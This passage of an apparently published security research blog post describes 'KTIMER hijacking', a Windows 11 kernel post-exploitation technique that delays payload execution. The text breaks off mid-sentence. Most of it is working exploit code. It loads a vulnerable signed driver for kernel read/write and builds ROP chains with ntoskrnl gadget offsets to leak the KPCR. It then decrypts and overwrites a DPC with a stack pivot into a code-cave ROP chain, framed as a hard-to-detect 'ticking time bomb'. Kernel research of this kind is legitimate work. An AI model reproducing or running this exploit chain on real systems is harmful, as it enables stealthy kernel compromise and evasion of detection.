@@ -1,0 +1,662 @@
+<!doctype html><html lang=en dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>Delaying Kernel Payloads by Hijacking KTIMERs & KDPCs (Part 2) | Gar Reversing</title>
+<meta name=keywords content="post_exploitation,windows_internals">
+<meta name=description content="In this two part blog post series we present KTIMER hijacking, a novel post-exploitation technique that delays the execution of kernel-mode payloads.
+In the first part whe focussed on Windows 11 timer internals and deferred procedure calls and showed that we can hijack KTIMER and KDCP objects to delay the execution of a function pointer. This second part focusses on implementing these findings in a proof of concept, illustrating the delay in execution of a kernel-mode payload.">
+<meta name=author content="Gary">
+<link rel=canonical href=https://gar-re.github.io/posts/ktimer-hijack-pt2/>
+<meta name=google-site-verification content="XYZabc">
+<meta name=yandex-verification content="XYZabc">
+<meta name=msvalidate.01 content="XYZabc">
+<link crossorigin=anonymous href=/assets/css/stylesheet.319f7209271a6127ecb9f000084aa4ce7f5f4394f5ef702b9cbb0f5bdd4523de.css integrity="sha256-MZ9yCScaYSfsufAACEqkzn9fQ5T173ArnLsPW91FI94=" rel="preload stylesheet" as=style>
+<script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
+<link rel=icon href=https://gar-re.github.io/favicon.ico>
+<link rel=icon type=image/png sizes=16x16 href=https://gar-re.github.io/favicon-16x16.png>
+<link rel=icon type=image/png sizes=32x32 href=https://gar-re.github.io/favicon-32x32.png>
+<link rel=apple-touch-icon href=https://gar-re.github.io/apple-touch-icon.png>
+<link rel=mask-icon href=https://gar-re.github.io/safari-pinned-tab.svg>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<noscript>
+<style>#theme-toggle,.top-link{display:none}</style>
+</noscript><meta property="og:title" content="Delaying Kernel Payloads by Hijacking KTIMERs & KDPCs (Part 2)">
+<meta property="og:description" content="In this two part blog post series we present KTIMER hijacking, a novel post-exploitation technique that delays the execution of kernel-mode payloads.
+In the first part whe focussed on Windows 11 timer internals and deferred procedure calls and showed that we can hijack KTIMER and KDCP objects to delay the execution of a function pointer. This second part focusses on implementing these findings in a proof of concept, illustrating the delay in execution of a kernel-mode payload.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://gar-re.github.io/posts/ktimer-hijack-pt2/">
+<meta property="og:image" content="https://gar-re.github.io/posts/ktimer-hijack-pt2/cover.png"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2023-09-30T00:00:00+00:00">
+<meta property="article:modified_time" content="2023-09-30T00:00:00+00:00"><meta property="og:site_name" content="Gar Reversing">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://gar-re.github.io/posts/ktimer-hijack-pt2/twittercard.png">
+<meta name=twitter:title content="Delaying Kernel Payloads by Hijacking KTIMERs & KDPCs (Part 2)">
+<meta name=twitter:description content="In this two part blog post series we present KTIMER hijacking, a novel post-exploitation technique that delays the execution of kernel-mode payloads.
+In the first part whe focussed on Windows 11 timer internals and deferred procedure calls and showed that we can hijack KTIMER and KDCP objects to delay the execution of a function pointer. This second part focusses on implementing these findings in a proof of concept, illustrating the delay in execution of a kernel-mode payload.">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://gar-re.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Delaying Kernel Payloads by Hijacking KTIMERs \u0026 KDPCs (Part 2)","item":"https://gar-re.github.io/posts/ktimer-hijack-pt2/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Delaying Kernel Payloads by Hijacking KTIMERs \u0026 KDPCs (Part 2)","name":"Delaying Kernel Payloads by Hijacking KTIMERs \u0026 KDPCs (Part 2)","description":"In this two part blog post series we present KTIMER hijacking, a novel post-exploitation technique that delays the execution of kernel-mode payloads. In the first part whe focussed on Windows 11 timer internals and deferred procedure calls and showed that we can hijack KTIMER and KDCP objects to delay the execution of a function pointer. This second part focusses on implementing these findings in a proof of concept, illustrating the delay in execution of a kernel-mode payload.\n","keywords":["post_exploitation","windows_internals"],"articleBody":"In this two part blog post series we present KTIMER hijacking, a novel post-exploitation technique that delays the execution of kernel-mode payloads. In the first part whe focussed on Windows 11 timer internals and deferred procedure calls and showed that we can hijack KTIMER and KDCP objects to delay the execution of a function pointer. This second part focusses on implementing these findings in a proof of concept, illustrating the delay in execution of a kernel-mode payload.\nIntroduction In the context of Proof of Concept or Get The F*ck Out (PoC||GTFO) we present a proof of concept implementation of KTIMER hijacking. Similarly to getting code execution by e.g. hijacking a kernel mode routine, KTIMER hijacking results in arbitrary code execution, but in a delayed manner (and periodic if necessary). This means that a “ticking time bomb” could live in the Windows kernel whilst the kernel exploit process is already terminated, making it harder to detect. Additionally, no Page Table Entries (PTE) have to be modified as the KDPC and KTIMER objects are already writeable, making it abide by the rules that HVCI has set.\nFor the proof of concept, we bring our own vulnerable driver (BYOVD), echo_driver.sys discovered by Protocol (@WindowsKernel) which has a write-up here. The vulnerable driver allows us to obtain an arbitrary read write (ARW) in the kernel, which was the prerequisite in the research from part 1. From the ARW we use the KernelForge technique by Dmytro Oleksiuk (@d_olex) to obtain the pointer to the KPCR. This technique is HVCI compliant. With the KPCR pointer, we traverse to the KPRCB and TimerTable, eventually searching for the KTIMER object that represents the nt!ExpCenturyDpcRoutine. We decrypt the DPC, search for a code cave and a stackpivot that returns there and set up a ROP chain that executes an arbitrary API call (nt!DbgPrintEx). We make sure that the ROP chain restores the execution flow before hijacking the DeferredRoutine with our stackpivot and DueTime with a value of our choosing.\nWe use the most recent Windows 11 22H2 (22621.2134, August 2023) at the time of our research as our target machine with default exploit mitigations in place but disabling HVCI if enabled. This is because HVCI will activate kCFG which will disallow the execution the hijacked DeferredRoutine as became clear in part 1. We make sure that the rest of the exploit is HVCI compliant, with an eventual kCFG bypass, KTIMER hijacking is also possible on machines that have HVCI enabled.\nThe proof of concept code can be found on GitHub.\nLet’s start!\nBYOVD ARW: EchOh-No! First, we have to meet the prerequisite that we have set in the research: an arbitrary read write (ARW) in the kernel. For this we use echo_driver.sys, for which the vulnerability details were published 14th of July 2023 by Protocol (@WindowsKernel). Details of the vulnerability can be found in the write-up. It is known that Microsoft does a bad job at revoking the certificates of vulnerable drivers, hence, the echo_driver.sys still loads on our target Windows 11 22H2. If for whatever reason the certificate of this driver gets revoked by Microsoft, just try another from Living Off The Land Drivers that yields you an ARW. We load the driver with the following command:\nsc.exe create echo_driver.sys binPath=C:\\windows\\temp\\echo_driver.sys type=kernel \u0026\u0026 sc.exe start echo_driver.sys Next, we open a handle to the driver and initialize it as per the details of the vulnerability.\nHANDLE hDriver = CreateFile(L\"\\\\\\\\.\\\\EchoDrv\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf(\"[!] Error while opening a handle to the driver: %d\\n\", GetLastError()); return 0; } printf(\"[+] Successfully obtained the handle to EchoDrv used for Kernel ARW: %d\\n\", hDriver); if (!initDriver(hDriver)) { printf(\"[!] Error initializing the driver: %d\\n\", GetLastError()); return 0; } The initialization includes a single DeviceIoControl() call with IOCTL 0x9e6a0594 to bypass an internal check.\n/** * Initializes the EchoDrv */ BOOL initDriver(HANDLE hDriver) { LPVOID buf = malloc(4096); //Call IOCTL that sets the PID variable and gets past the DWORD check \tBOOL success = DeviceIoControl(hDriver, 0x9e6a0594, NULL, NULL, buf, 4096, NULL, NULL); if (!success) { printf(\"[!] DeviceIOControl 0x9e6a0594 failed: %d\\n\", GetLastError()); CloseHandle(hDriver); return NULL; } return 1; } After initialization we can use the IOCTL 0x60a26124 which will make the driver execute MmCopyVirtualMemory(), allowing us to read and write from kernel virtual memory. We define two functions read64() and write64() which reads or writes QWORDS at specific addresses.\nstruct ARW { HANDLE targetProcess; LPVOID fromAddress; LPVOID toAddress; DWORD length; LPVOID padding; DWORD returnCode; }; /** * Reads DWORD64 from \"where\" in virtual memory */ DWORD64 read64(HANDLE hProcess, HANDLE hDriver, DWORD64 where) { LPVOID lpWhat = calloc(1, sizeof(DWORD64)); ARW arw{}; arw.fromAddress = (LPVOID)where; arw.length = 0x8; arw.targetProcess = hProcess; arw.toAddress = lpWhat; DeviceIoControl(hDriver, 0x60a26124, \u0026arw, sizeof(ARW), \u0026arw, sizeof(ARW), NULL, NULL); return ((DWORD64*)lpWhat)[0]; } /** * Writes DWORD64 \"what\" to DWORD64 \"where\" in virtual memory */ VOID write64(HANDLE hProcess, HANDLE hDriver, DWORD64 where, DWORD64 what) { LPVOID lpWhat = calloc(1, sizeof(DWORD64)); ((DWORD64*)lpWhat)[0] = what; ARW arw{}; arw.fromAddress = lpWhat; arw.length = 0x8; arw.targetProcess = hProcess; arw.toAddress = (LPVOID)where; DeviceIoControl(hDriver, 0x60a26124, \u0026arw, sizeof(ARW), \u0026arw, sizeof(ARW), NULL, NULL); } KPCR using KernelForge Now that we can read and write to kernel memory, we can start KTIMER hijacking by first leaking the TimerTable address. Some kernel vulnerabilities allow us to leak the KPCR or some pointer inside the KPCR/KPRCB directly, however, the driver we chose only grants us an ARW. There have been some attempts to heuristically find the KPCR but we decided that we wanted a fool-proof method of finding it. We chose the KernelForge technique by Dmytro Oleksiuk (@d_olex). This technique is described in detail in a blog post by Connor McGarr (@33y0re) and allows us to execute a ROP chain abiding by the rules that HVCI has set (HVCI compliant).\nThe KernelForge technique boils down to the following steps:\n Create a “dummy” thread in a suspended state using CreateThread(); Get the KTHREAD object of the thread using NtQuerySystemInformation(); Locate the return address of nt!KiApcInterrupt+0x35c on the thread stack; Write a ROP chain that ends with an API call to nt!ZwTerminateThread to gracefully continue; Resume the dummyThread to trigger the ROP chain.  We explain these steps one by one.\n1. Dummy Thread The kernel typically chooses CPU 0 to run DPCs as it’s the timekeeping processor that will always be active to pick up clock interrupts. This means that, when we leak the KPCR - which is a per-processor structure - we want to leak it from CPU 0. As a result, we have to make sure that the “dummy” thread also executes on CPU 0. We can set the thread affinity mask to 0x1 using SetThreadAffinityMask() to enforce running the thread on CPU 0 after we have created the thread using CreateThread().\nWe write a dummyFunction() and createdummyThread() which creates the thread in a suspended state and sets the thread affinity mask.\n/** * Dummy function used to spawn dummy thread */ void dummyFunction() { return; } /** * Creates a dummy thread used in the KernelForge technique */ HANDLE createdummyThread() { HANDLE dummyThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dummyFunction, NULL, CREATE_SUSPENDED, NULL); if (dummyThread == INVALID_HANDLE_VALUE) { return NULL; } SetThreadAffinityMask(dummyThread, 0x1  0); //use first processor that contains the TimerTable \treturn dummyThread; } We call it as such:\n// 1) Create a \"dummy\" thread in a suspended state using CreateThread HANDLE dummyThread = createdummyThread(); if (!dummyThread) { printf(\"[!] Error creating dummy thread\\n\"); return NULL; } printf(\"[+] Created dummy thread: %d\\n\", dummyThread); 2. KTHREAD Now that we have created the thread in a suspended state on CPU 0 we can leak the KTHREAD object using NtQuerySystemInformation(). We won’t go into detail for this technique as it has been documented many times. For a good reference see Connor’s blog post.\nWe use the following code. For the getKThread() function see the code on GitHub.\n// 2) Get the KTHREAD object for the thread using NtQuerySystemInformation PVOID kThread = getKThread(dummyThread); if (!kThread) { printf(\"[!] Error getting KTHREAD address\\n\"); return NULL; } printf(\"[+] KTHREAD at: %p\\n\", kThread); 3. Return Address on Thread Stack With the KTHREAD we search for the return address of nt!KiApcInterrupt+0x35c on the thread stack which is at nt + 0x43703c on our target build. This is a return address on the thread stack which returns into the kernel, meaning that if we overwrite the stack at that location with a ROP chain, it will execute the ROP gadgets in the kernel. Again, for elaboration check out Connor’s blog post.\nThe following code searches for the target return address:\n// 3) Locate the return address of nt!KiApcInterrupt+0x35c on the thread stack DWORD64 kThreadStackBase = (DWORD64)kThread + 0x38; DWORD64 stackBase = read64(hProcess, hDriver, kThreadStackBase); printf(\"[+] stackBase at: %p\\n\", stackBase); DWORD64 retAddr = 0; for (int i = 0x8; i  0x7000 - 0x8; i += 0x8) { ULONG64 value = read64(hProcess, hDriver, stackBase - i); if ((value \u0026 0xfffff00000000000) == 0xfffff00000000000) { // nt!KiApcInterrupt+0x35c?  if (value == ntBase + 0x43703c) { retAddr = stackBase - i; printf(\"[+] Stack address of nt!KiApcInterrupt+0x35c: %p\\n\", retAddr); break; } } value = 0; } 4. KPCR ROP Chain Now that we the address of the thread stack we can start building our ROP chain that retrieves the KPCR. Conveniently, the kernel includes a specific gadget that exactly does this: nt!KeGetPcr: mov rax, gs:[0x18]; ret;. The base address for gs is loaded from the processor’s Model Specific Register (MSR) 0xC0000102, which the kernel initializes with the address of the processor’s KPCR (source). At KPCR + 0x18 the KPCR holds the self reference, thus at gs:[0x18].\nRefer to the ROP chain below. We write nt!KeGetPcr to the target return address and start our ROP chain there. When the address to the KPCR is stored in rax we pop a user-mode address in rcx before writing rax (KPCR) to that user-mode address. Afterwards, we end the ROP chain with a return into nt!ZwTerminateThread to gracefully continue execution terminating the thread.\n// 4) Write our ROP chain that uses nt!KeGetPcr to write the KPCR to our usermode address. // We end the ROP chain with an API call to nt!ZwTerminateThread to gracefully continue. DWORD64 kPCR = NULL; write64(hProcess, hDriver, retAddr, (DWORD64)ntBase + 0x3d73a0); // nt!KeGetPcr (mov rax, gs:[0x18]; ret;) write64(hProcess, hDriver, retAddr + 0x8, (DWORD64)ntBase + 0x20c721); // 0x14020c721: pop rcx ; ret ; (1 found) write64(hProcess, hDriver, retAddr + 0x10, (DWORD64)\u0026kPCR); write64(hProcess, hDriver, retAddr + 0x18, (DWORD64)ntBase + 0x209d0d); // 0x140209d0d: mov qword [rcx], rax ; ret ; (1 found)  write64(hProcess, hDriver, retAddr + 0x20, (DWORD64)ntBase + 0x20c721); // 0x14020c721: pop rcx ; ret ; (1 found) write64(hProcess, hDriver, retAddr + 0x28, (DWORD64)dummyThread); write64(hProcess, hDriver, retAddr + 0x30, (DWORD64)ntBase + 0x3275f2); // 0x1403275f2: pop rdx; ret; (1 found) write64(hProcess, hDriver, retAddr + 0x38, 0x0); write64(hProcess, hDriver, retAddr + 0x40, (DWORD64)ntBase + 0x2038f5); // 0x1402038f5: pop rax ; ret ; (1 found) write64(hProcess, hDriver, retAddr + 0x48, (DWORD64)ntBase + 0x42dfc0); // nt!ZwTerminateThread write64(hProcess, hDriver, retAddr + 0x50, (DWORD64)ntBase + 0x201b7b); // 0x140201b7b: ret ; (1 found) ALIGN STACK 16 bytes write64(hProcess, hDriver, retAddr + 0x58, (DWORD64)ntBase + 0x2024e2); // 0x1402024e2: jmp rax ; (1 found) 5. Triggering the ROP Chain To trigger the ROP chain we resume the thread using ResumeThread() and sleep for 1s for the ROP chain to execute and store the KPCR in the user-mode address.\n// 5) Resume the dummyThread to trigger the ROP chain ResumeThread(dummyThread); // Sleep s.t. thread has time to execute Sleep(1000); Running the code, we see that it outputs that it found the KPCR at 0xfffff80629512000. In the debugger, we confirm that we indeed found the correct address for the KPCR using KernelForge. KTIMER Hijack Now that we obtained the address to the KPCR using KernelForge we start with the actual logic behind KTIMER hijacking. First, we describe our implementation for traversing the KTIMER objects to find the object that belongs to the nt!ExpCenturyDpcRoutine. Second, we describe our implementation for the DPC decryption and the confirmation whether we found the correct KTIMER object. Next, we describe our implementation for the calling of an arbitrary kernel-mode routine nt!DbgPrintEx with controlled arguments and hijack the target DeferredRoutine. Finally, we hijack the KTIMER by setting the DueTime and leave a “ticking time bomb” the kernel.\nKTIMER traverse As described in part 1 of the series, from the KPCR we can find the TimerTable and the KTIMER objects for that specific processor. These objects contain the Deferred Procedure Calls (DPCs) that want to be fired at a specific interrupt time.\nRefer to the code below. First, we read the interrupt time and system time from KUSER_SHARED_DATA using the ARW from our BYOVD. On our build KUSER_SHARED_DATA still resides on the static location 0xfffff78000000000. We use these times to calculate the absolute time of each KTIMER object’s DueTime. Next, we loop over the second array containing the standard timers. Recall that this array contains 256 entries (0xff). While the linked list with KTIMER objects is not “empty” for each timer entry we retrieve its DueTime and see if it is large enough to represent the passing of the century. If found, we jump out of the loops and continue execution. If not found, we end up with the last KTIMER object in the linked list from the last entry in the array with standard timers. Hence, we have to check whether we actually found the correct KTIMER object representing the nt!ExpCenturyDpcRoutine.\nDWORD64 kUserSharedData = 0xfffff78000000000; DWORD64 interruptTime = read64(hProcess, hDriver, kUserSharedData + 0x8); //KUSER_SHARED_DATA.InterruptTime DWORD64 systemTime = read64(hProcess, hDriver, kUserSharedData + 0x14); //KUSER_SHARED_DATA.SystemTime DWORD64 kTimer, dueTime, listHead, flink = 0; for (int i = 0; i  0xff; i++) { // KPRCB TimTab TimEnt [1] [i] |KTIM| LIST  listHead = kPcr + 0x180 + 0x3c00 + 0x200 + 0x2000 + i * 0x20 + 0x8; flink = read64(hProcess, hDriver, listHead); kTimer = flink - 0x20; int listEntry = 0; while (flink != listHead) { dueTime = read64(hProcess, hDriver, kTimer + 0x18); if (((systemTime - interruptTime + dueTime) \u0026 0x0220000000000000) == 0x0220000000000000) { printf(\"[+] Found likely kTimer entry for nt!ExpCenturyDpcRoutine: %p at TimerTable[1][%d], LIST_ENTRY #%d\\n\", kTimer, i, listEntry); goto found; } flink = read64(hProcess, hDriver, flink); listEntry++; kTimer = flink - 0x20; } } found: DWORD64 encryptedDpc = read64(hProcess, hDriver, kTimer + 0x30); printf(\"[+] Encrypted DPC: %p\\n\", encryptedDpc); Running the code, we see that it outputs that it found the KTIMER at 0xfffff8062c949ee0. We confirm that we indeed found the correct address for the KTIMER at the 196th element in the array for standard timers. Decrypting the DPC should give us the DPC at 0xfffff8062c949ea0 (magenta) DPC Decryption To confirm that we actually found the correct KTIMER object, we first have to decrypt the DPC. The decryption routine reversed in part 1 can be implemented with the following function. First, we read nt!KiWaitNever and nt!KiWaitAlways using the driver vulnerability. These, along with the address of the KTIMER object are used to decrypt the encrypted DPC in the KTIMER object.\n/** * Decrypts the DPC value in the KTIMER object */ DWORD64 decryptDpc(HANDLE process_handle, HANDLE driver_handle, DWORD64 nt_base, DWORD64 kTimer, DWORD64 encryptedDpc) { DWORD64 kiWaitNever = read64(process_handle, driver_handle, (DWORD64)nt_base + 0xd1de48); DWORD64 kiWaitAlways = read64(process_handle, driver_handle, (DWORD64)nt_base + 0xd1e0d8); DWORD64 dpc = encryptedDpc; dpc ^= kiWaitNever; dpc = _rotl64(dpc, kiWaitNever \u0026 0xff); dpc ^= kTimer; dpc = _byteswap_uint64(dpc); dpc ^= kiWaitAlways; return dpc; } We confirm whether we found the target KTIMER object by calling this decryption routine and comparing its DeferredRoutine with the actual function address of nt!ExpCenturyDpcRoutine which is at nt + 0x60cff0 on our build.\nDWORD64 dpc = decryptDpc(hProcess, hDriver, (DWORD64)ntBase, kTimer, encryptedDpc); DWORD64 expCenturyDpcRoutine = (DWORD64)ntBase + 0x60cff0; DWORD64 dpcRoutine = read64(hProcess, hDriver, dpc + 0x18); if (dpcRoutine == expCenturyDpcRoutine) { printf(\"[+] Found ExpCenturyDpc: %p\\n\", dpc); } else { printf(\"[!] Did not find ExpCenturyDpc, exiting...\\n\"); return 0; } Running the code, we see that it indeed outputs that it found the nt!ExpCenturyDpcRoutine DPC at 0xfffff8062c949ea0 after decryption. Arbitrary Kernelmode Routine ROP chain Now that we know the locations the target KTIMER object and the corresponding KDPC object we decide with what we want to hijack the KDPC.DeferredRoutine and KTIMER.DueTime. The idea is that we use a specific gadget for the DeferredRoutine such that we can pivot the stack to a code cave where we store a ROP chain. For this, we first figure out which registers we can play with at the time of the execution of the DeferredRoutine. We modify the KDPC object as such, modifying the QWORDS which we think we can play with.\nwrite64(hProcess, hDriver, dpc + 0x10, 0x4040404040404040); // ProcessorHistory write64(hProcess, hDriver, dpc + 0x18, (DWORD64)ntBase + 0x21a154); // DeferredRoutine write64(hProcess, hDriver, dpc + 0x20, 0x4141414141414141); // DeferredContext write64(hProcess, hDriver, dpc + 0x28, 0x4242424242424242); // SystemArgument1 write64(hProcess, hDriver, dpc + 0x30, 0x4343434343434343); // SystemArgument2 write64(hProcess, hDriver, dpc + 0x38, 0x4444444444444444); // DpcData Running the code and breaking in the debugger we see that the DPC (magenta) was indeed modified with our supplied values, including the gadget (orange). We set a breakpoint on the gadget and manually change the KTIMER.DueTime at offset 0x18 to the value of the current interrupt time s.t. it is queued immediately. Continuing execution, we see that we break at the gadget. Outputting the state of the registers, we see that rbx holds the value of the KDPC.DeferredContext which we control. Also, rsi and rcx both hold the address of the target KDPC. This should give us enough control to play with the available gadgets and somehow pivot the stack to a ROP chain.\nInspecting the target KDPC again, we notice that the KDPC.ProcessorHistory is OR’ed with 0x1 (dark green). This is highly likely because the DPC runs on CPU 0 as we have mentioned before. This is something we need to take into account when we want to use that address. Finding a Code Cave Before we can continue, we have to decide where we want to store our ROP chain and data. We only need about 0x200 bytes, so we check whether the end of the .data section of the kernel (nt) is used. The following screenshot shows part of the !dh command containing information about the writeable .data section starting at nt + 0xc00000 and the ALMOSTRO section thereafter, starting at nt + 0xd1c000. The .data section has a virtual size of 0x11bdc8 bytes, meaning that there is a writeable code cave of 0x238 bytes between the two sections. We use that location to store our ROP chain and data. Because of the stackpivot we use, we have to add 1. This will become clear in the following section. Our code cave becomes:\nDWORD64 codeCave = (DWORD64)ntBase + 0xd1c000 - 0x238 + 1; // at end of .data section Replacing DeferredRoutine with Stackpivot As we have seen, we control the data that rcx points to (the KDPC object) and the value of rdx. We came up with the solution in the following code block that uses a JOP gadget for the stackpivot. The JOP gadget moves the KDPC.ProcessorHistory to rsp and uses it as the new stack, before jumping to rdx. In rdx we put a NOP ROP gadget that returns into the newly controlled stack. We place the code cave at KDPC.ProcessorHistory and make sure that the least significant bit is 0x1 because of the restriction we have seen before (it will set this bit because the DPC runs on CPU 0). This will misalign the stack with 0x1 byte which we have to account for later.\n// new stack address write64(hProcess, hDriver, dpc + 0x10, codeCave); // KTIMER.DPC.DeferredRoutine - stackpivot write64(hProcess, hDriver, dpc + 0x18, (DWORD64)ntBase + 0x42ce28); // 0x42ce28: mov rsp, qword [rcx+0x10] ; jmp rdx ; (1 found)  // will end up in rdx write64(hProcess, hDriver, dpc + 0x20, (DWORD64)ntBase + 0x21a154); // 0x21a154: nop; ret; (1 found)  // systemargument and further write64(hProcess, hDriver, dpc + 0x28, (DWORD64)ntBase + 0x21a154); // 0x21a154: nop; ret; (1 found) write64(hProcess, hDriver, dpc + 0x30, 0x4444444444444442); write64(hProcess, hDriver, dpc + 0x38, 0x4444444444444443);  Note that we restrict ourselves to only use gadgets from ntoskrnl.exe. We are sure that there are way better solutions if you take the time to search for gadgets in other kernel modules. Nevertheless, our solution suffices for a proof of concept and show some tricks when gadgets are scarce.\n Aligning RSP First thing we do in our ROP chain is aligning the stack to 0x8 bytes. For this, we AND rsp with 0xfffffffffffffffe as can be seen below.\n// align rsp write64(hProcess, hDriver, codeCave, (DWORD64)ntBase + 0x868131); // 0x868131: pop r8; ret; (1 found) write64(hProcess, hDriver, codeCave + 0x8, codeCave + 0x180 - 1); // 0xfffffffffffffffe write64(hProcess, hDriver, codeCave + 0x10, (DWORD64)ntBase + 0x368d4e); // 0x368d4e: and rsp, qword[r8]; inc word[rcx + 0x20]; add rsp, 0x28; ret; (1 found) codeCave--; //alignment  //DATA write64(hProcess, hDriver, codeCave + 0x180, 0xfffffffffffffffe); // mask to align stack “Calling” nt!DbgPrintEx Now that the stack is aligned we set up the arguments for the “call” to nt!DbgPrintEx (actually a return into). MSDN defines the following function prototype. The first argument, rcx, must contain a ComponentId. We use DPFLTR_IHVDRIVER_ID which is 77. We leave the level, rdx, 0 and store the pointer to our string in r8. We set r9 0 because we will not be using a format string. The string is stored in little endian and reads: “KTIMER hijack by Gerr.re”.\nNTSYSAPI ULONG DbgPrintEx( [in] ULONG ComponentId, [in] ULONG Level, [in] PCSTR Format, ... ); We end up with the following ROP chain to “call” the arbitrary API nt!DbgPrintEx.\n// nt!DbgPrintEx write64(hProcess, hDriver, codeCave + 0x40, (DWORD64)ntBase + 0x7bb073); // 0x7bb073: pop rcx ; ret ; (1 found) write64(hProcess, hDriver, codeCave + 0x48, 77);\t// DPFLTR_IHVDRIVER_ID write64(hProcess, hDriver, codeCave + 0x50, (DWORD64)ntBase + 0x72b676); // 0x72b676: pop rdx; ret; (1 found) write64(hProcess, hDriver, codeCave + 0x58, 0x0); // Level = 0 write64(hProcess, hDriver, codeCave + 0x60, (DWORD64)ntBase + 0x868131); // 0x868131: pop r8; ret; (1 found) write64(hProcess, hDriver, codeCave + 0x68, codeCave + 0x200); // pointer to STRING write64(hProcess, hDriver, codeCave + 0x70, (DWORD64)ntBase + 0x447723); // 0x447723: pop r9 ; ret ; (1 found) write64(hProcess, hDriver, codeCave + 0x78, 0x0); write64(hProcess, hDriver, codeCave + 0x80, (DWORD64)ntBase + 0x2cc330); // nt!DbgPrintEx write64(hProcess, hDriver, codeCave + 0x88, (DWORD64)ntBase + 0x67bfaf); // 0x67bfaf: add rsp, 0x28 ; ret ; (1 found)  //DATA write64(hProcess, hDriver, codeCave + 0x200, 0x682052454d49544b); // STRING write64(hProcess, hDriver, codeCave + 0x208, 0x7962206b63616a69); // STRING write64(hProcess, hDriver, codeCave + 0x210, 0x65722e7272654720); // STRING write64(hProcess, hDriver, codeCave + 0x218, 0x000000000000000a); // STRING Restoring the Execution Flow Now that we achieved our goal of calling an arbitrary API we have to restore the execution flow. In kernel space this is crucial because a violation will result in a Blue Screen Of Death (BSOD). Unfortunately, because we overwrote the original rsp using our stackpivot we have to find another way of retrieving it.\nAt the time of executing the DeferredRoutine, the registers are as follows as we have seen before. We note that r14 is 0x2a0 bytes offset from rsp, which we empirically found is always the case. Using r14 and subtracting the offset of 0x2a0 yields the original rsp. We use the following ROP chain. First, we store a ROP gadget in rax that pops a value from the stack and returns into the next gadget. This is needed because we use a COP gadget to move r14 into rcx which will push a return address on the stack. The gadget in rax will pop that return address to nullify the call. Next, we use a gadget to subtract the offset from rcx, which comes with some side effects like adding 0x8 to the address. We can simply nullify this by subtracting 0x8 from the target address containing the offset 0x2a0. Now that we have the original value of rsp, we push it on stack and remember the stack location. Finally, we store a NOP ROP gadget in rdx and use the same gadget as we used as the stackpivot to restore the original rsp. Returning from the NOP ROP gadget will return into the original return address, continuing the original execution flow.\n// restore execution flow from r14 write64(hProcess, hDriver, codeCave + 0xb8, (DWORD64)ntBase + 0x687534); // 0x687534: pop rax; ret; (1 found) write64(hProcess, hDriver, codeCave + 0xc0, (DWORD64)ntBase + 0x687534); // 0x687534: pop rax; ret; (1 found) write64(hProcess, hDriver, codeCave + 0xc8, (DWORD64)ntBase + 0x412334); // 0x412334: mov rcx, r14; call rax; (1 found) write64(hProcess, hDriver, codeCave + 0xd0, (DWORD64)ntBase + 0x72b676); // 0x72b676: pop rdx; ret; (1 found) write64(hProcess, hDriver, codeCave + 0xd8, codeCave + 0x1a8 - 0x8); // pointer to rsp offset minus 0x8 write64(hProcess, hDriver, codeCave + 0xe0, (DWORD64)ntBase + 0x868131); // 0x868131: pop r8; ret; (1 found) write64(hProcess, hDriver, codeCave + 0xe8, codeCave + 0x1c0); // some writeable address write64(hProcess, hDriver, codeCave + 0xf0, (DWORD64)ntBase + 0x28ed93); // 0x28ed93: sub rcx, qword[rdx + 0x08]; mov qword[r8 + 0x08], rcx; ret; (1 found) DWORD64 ptrRsp = codeCave + 0xf8; write64(hProcess, hDriver, codeCave + 0xf8, (DWORD64)ntBase + 0x3f3a37); // 0x3f3a37: push rcx ; and al, 0x60 ; add rsp, 0x58 ; ret ; (1 found) write64(hProcess, hDriver, codeCave + 0x150, (DWORD64)ntBase + 0x72b676); // 0x72b676: pop rdx; ret; (1 found) write64(hProcess, hDriver, codeCave + 0x158, (DWORD64)ntBase + 0x21a154); // 0x21a154: nop; ret; (1 found) write64(hProcess, hDriver, codeCave + 0x160, (DWORD64)ntBase + 0x7bb073); // 0x7bb073: pop rcx ; ret ; (1 found) write64(hProcess, hDriver, codeCave + 0x168, ptrRsp - 0x10); // pointer to rsp minus 0x10 write64(hProcess, hDriver, codeCave + 0x170, (DWORD64)ntBase + 0x42ce28); // 0x42ce28: mov rsp, qword [rcx+0x10] ; jmp rdx ; (1 found)  //DATA write64(hProcess, hDriver, codeCave + 0x1a8, 0x2a0); // offset between r14 and original rsp Setting the DueTime Now that the execution flow is restored using the ROP chain we can actually hijack the KTIMER by setting the DueTime to a specific value. For this, we can calculate what interrupt time belongs to what absolute time by taking the ticks per second, interrupt time and system time into account. We chose to fire the KTIMER at a specific amount of seconds from the current interrupt time. The following code queues the hijacked DPC 10 seconds from now.\nDWORD64 ticksPerSecond = 10000000; //100ns DWORD64 seconds = 10; DWORD64 fireTime = interruptTime + seconds * ticksPerSecond; write64(hProcess, hDriver, kTimer + 0x18, fireTime); printf(\"[+] Set DueTime to %d seconds from now.\\n\", seconds); The Proof is in the Pudding See the screenshot and screencapture below. We use Sysinternals Suite DebugView to illustrate the proof of concept, making sure that we capture the kernel. Running the proof of concept, we notice that the exploiting process finishes before the hijack calls nt!DbgPrintEx after the specified delay, outputting the supplied debug string in DebugView!\n  A Note on PatchGuard To draw some conclusions whether this technique gets detected by PatchGuard, we leave the “ticking time bomb” in the kernel on a build that has not enabled (remote) kernel debugging. We first confirm that the proof of concept code works by leaving the DueTime 10 seconds from the time we set the 